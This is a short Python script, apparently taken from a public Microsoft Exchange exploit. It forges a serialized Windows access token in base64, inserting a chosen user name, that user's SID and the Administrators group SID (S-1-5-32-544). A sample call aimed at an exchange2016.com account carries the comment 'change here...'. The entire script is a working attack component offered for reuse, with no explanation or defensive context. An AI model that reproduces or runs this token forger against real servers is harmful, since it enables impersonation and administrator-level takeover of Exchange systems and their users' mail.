from struct import *
import base64

def gen_token(uname, sid):
    version = 0
    ttype = 'Windows'
    compressed = 0
    auth_type = 'Kerberos'
    raw_token = b''
    gsid = 'S-1-5-32-544'
 
    version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
    type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
    compress_data = b'C' + (compressed).to_bytes(1, 'little')
    auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
    login_data = b'L' + (len(uname)).to_bytes(1, 'little') + uname.encode()
    user_data = b'U' + (len(sid)).to_bytes(1, 'little') + sid.encode()
    group_data = b'G' + pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
    ext_data = b'E' + pack('>I', 0) 
 
    raw_token += version_data
    raw_token += type_data
    raw_token += compress_data
    raw_token += auth_data
    raw_token += login_data
    raw_token += user_data
    raw_token += group_data
    raw_token += ext_data
 
    data = base64.b64encode(raw_token).decode()
 
    return data


print(gen_token("test@exchange2016.com","S-1-5-21-46962994-2066588249-799565096-1145")) # change here...